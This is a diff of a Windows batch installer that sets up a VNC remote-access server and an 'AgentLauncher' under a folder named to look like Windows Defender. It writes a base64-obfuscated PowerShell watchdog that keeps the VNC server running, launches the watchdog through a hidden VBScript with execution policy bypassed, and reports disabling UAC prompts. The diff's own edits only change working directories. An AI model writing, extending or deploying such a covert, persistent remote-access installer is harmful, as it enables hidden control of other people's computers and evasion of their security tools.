@@ -169,7 +169,6 @@ REM --- Write watchdog PowerShell script ---
 powershell -NoProfile -Command "$b64='dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABpAGYAIAAoACEAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIABWAG4AYwBEAGkAcgBlAGMAdAAgAC0ARQBBACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACkAIAB7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAVgBuAGMARABpAHIAZQBjAHQALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAcABvAHIAdAA9ADcAMAAwADIAIABjAHcAZAA9AEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABWAG4AYwBEAGkAcgBlAGMAdABcAHYAbgBjACAAZgBwAHMAPQAzADYAMAAgAHMAYwBhAGwAZQA9ADAAIgAgAC0AVwBvAHIAawBpAG4AZwBEAGkAcgBlAGMAdABvAHIAeQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAFYAbgBjAEQAaQByAGUAYwB0AFwAdgBuAGMAIgAgAH0AOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgADUAIAB9AA=='; [IO.File]::WriteAllBytes('%DEST%\vnc-watchdog.ps1', [Convert]::FromBase64String($b64))"
 REM --- Write watchdog VBScript (launches PS1 fully hidden) ---
 echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\vnc-watchdog.vbs"
-echo WshShell.CurrentDirectory = "C:\ProgramData\Windows Defender\VncDirect\vnc" >> "%DEST%\vnc-watchdog.vbs"
 echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\Windows Defender\vnc-watchdog.ps1", 0, False >> "%DEST%\vnc-watchdog.vbs"
 echo     Watchdog VBScript written.
 
@@ -207,7 +206,9 @@ echo     UAC prompts disabled. Restart required to take effect.
 
 REM --- 8. Start services ---
 echo [7/7] Starting Agent and VNC Server...
+cd /d "%DEST%\VncDirect\vnc"
 start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+cd /d "%DEST%"
 start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%
 
 REM Wait for port
